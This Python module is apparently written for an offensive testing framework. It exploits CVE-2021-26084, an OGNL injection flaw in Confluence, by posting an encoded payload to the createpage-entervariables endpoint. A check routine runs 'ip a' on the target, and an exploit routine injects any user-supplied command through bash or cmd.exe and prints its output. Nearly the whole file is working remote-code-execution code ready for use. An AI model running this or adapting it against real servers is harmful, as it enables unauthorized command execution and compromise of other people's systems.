#!/usr/bin/env python3
# -*- encoding: utf-8 -*-



import requests
import sys
import os
import urllib3
import argparse
from rich.console import Console
from rich.table import Table
from bs4 import BeautifulSoup
urllib3.disable_warnings()

class Module:
    def __init__(self, logger):
        self.logger = logger
        self.options = {
            "url": {"value": "127.0.0.1", "required": True},
            "command": {"value": "id", "required": True},
            "protocol":{"value": "http://","required": True},
        }
    
    def info(self):
        console = Console()
        table = Table()
        table.add_column("Author")
        table.add_column("Description")
        table.add_column("Other")
        table.add_row("_0xf4n9x_","CVE-2021-26084 Confluence OGNL injection vulnerability","fanq.xu@gmail.com")
        console.print(table)       

    def run(self):
        for key in self.options:
            if (
                self.options[key]["value"] is None
                and self.options[key]["required"] is True
            ):
                self.logger.error("Required key {} is not set".format(key))
                return

        if not self.options["url"]["value"].startswith("http"):
            test_protocol = self.options["protocol"]["value"]
            tmp_url =  self.options["url"]["value"]
            url = test_protocol + tmp_url
            command = self.options["command"]["value"]
            print("\033[32m[Target]\033[0m",url)
            print("\033[32m[Command]\033[0m",command)
            #POC
            def poc(url):
                poc_url =  url + "/pages/createpage-entervariables.action?SpaceKey=x"
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
                    "Content-Type": "application/x-www-form-urlencoded"}
                params = {"queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022ip a\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
                try:
                    try:
                        res = requests.post(poc_url, headers=headers, data=params,
                                    timeout=10, verify=False)
                        if 'inet' and 'inet6' in res.text:
                            print("[+] " + url + " is vulnerable!")
                            
                            
                            return 1
                        else:
                            print("[-] " + url + " is not vulnerable!")
                            
                    except:
                        print("[-] vulnerability was not found.")
                        exit(0)
                except:
                    exit(1)
            
            #EXP
            def exp(url,command):
                exp_url = url + "/pages/createpage-entervariables.action?SpaceKey=x"
                headers = {
                    "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
                    "Content-Type": "application/x-www-form-urlencoded"}
                params = {
                    "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}

                res = requests.post(exp_url, headers=headers, data=params,
                                timeout=10, verify=False).text
                soup = BeautifulSoup(res, "html5lib")
                content = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})[
                                                        'value']
                print(content.replace('aaaaaaaa[', '').replace('\n]', ''))
            
            poc(url)
            if poc(url) == 1:
                exp(url,command)
            